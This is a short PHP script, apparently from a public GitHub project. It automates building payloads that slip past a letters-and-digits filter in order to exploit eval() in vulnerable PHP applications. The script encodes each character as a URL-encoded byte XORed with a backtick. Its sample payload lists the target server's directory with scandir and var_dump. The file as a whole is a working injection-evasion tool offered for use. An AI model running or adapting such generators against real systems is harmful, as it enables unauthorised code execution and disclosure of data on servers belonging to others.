<?php

/**
 * Author : Inazo 
 * Description : little script to automate payload string generator to exploit eval() in PHP with weak control and pattern excluding lot of chars 
 * Todo : edit the code to allow ", adding time generation, adding percent evolution 
 * Licence : GPL V2
 * Git : https://github.com/inaz0/EasyPayloads
 * Website : https://devops.kanjian.fr
 */

$payloadToEncode  = '$_=\'scandir\';$__=\'var_dump\';$__($_(\'./\'));';
$regexExcludeChar = '/[a-z]|[0-9]/i';
 
$payloadLength = strlen( $payloadToEncode );
$payloadFinish = '';

echo '+-------------------------------------------------------+'.PHP_EOL;
echo '|               START PAYLOAD GENERATOR  V 1.0          |'.PHP_EOL;
echo '+-------------------------------------------------------+'.PHP_EOL.PHP_EOL;

echo '>> Payload to encode 	   : '.$payloadToEncode.''.PHP_EOL;
echo '>> Regex for exclude char : '.$regexExcludeChar.''.PHP_EOL.PHP_EOL;

echo '>> Start enconding...'.PHP_EOL.PHP_EOL;


for( $i = 0; $i < $payloadLength; $i++ ){

	if( preg_match( $regexExcludeChar, $payloadToEncode[ $i ] ) ){
	
		//-- to start to the first ascii code
		$start = 0;
		
		//-- in the loop to test all ascii code to validate the current char need
		while( $start <= 255 ){

			if( $start < 10 ){

				$startAsciiValue = '0'.$start;
			}
			else{
				$startAsciiValue = $start;
			}
			
			$carac = urldecode('%'.$startAsciiValue);

			if( $carac == '"' ){}

			else{

				if( $carac == "'" ){
					$carac = "\\'";
				}

				$c = ( $carac ^ '`' );

				//-- to avoid syntax problem in eval string
				if( $c != '"' ){

					$test = '$_="'.( $carac ^ '`' ).'";';

					eval($test);

					//-- use strtolower beacause php are case insensitive for function name
					if( strtolower($_) === strtolower($payloadToEncode[ $i ]) ){
						
						$payloadFinish .= '\'.(%'.$startAsciiValue.'^\'`\').\'';
						break;
					}
				}
			}
			
			$start++;
		}
	}
	else{
		
		$payloadFinish .= $payloadToEncode[ $i ];
	}
}

echo '>> Finish, the payload was : '.PHP_EOL;
echo $payloadFinish;